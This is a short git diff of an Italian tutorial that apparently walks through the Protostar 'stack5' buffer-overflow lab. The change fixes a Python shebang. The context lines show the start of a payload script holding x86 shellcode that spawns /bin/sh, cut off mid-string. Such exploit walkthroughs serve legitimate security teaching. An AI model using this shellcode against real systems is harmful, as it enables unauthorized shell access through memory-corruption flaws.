@@ -87,7 +87,7 @@ Codifichiamo le istruzioni esadecimali sotto forma di stringa e otteniamo:
 #### 5. Preparazione dell'input
 Creiamo uno script python chiamato _stack5\_payload.py_ che stampa in output l'input da passare a _stack5_
 ```python
-#!/usr/bin/python!
+#!/usr/bin/python
 shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73" + \
             "\x68\x68\x2f\x62\x69\x6e\x89" + \
             "\xe3\x89\xc1\x89\xc2\xb0\x0b" + \
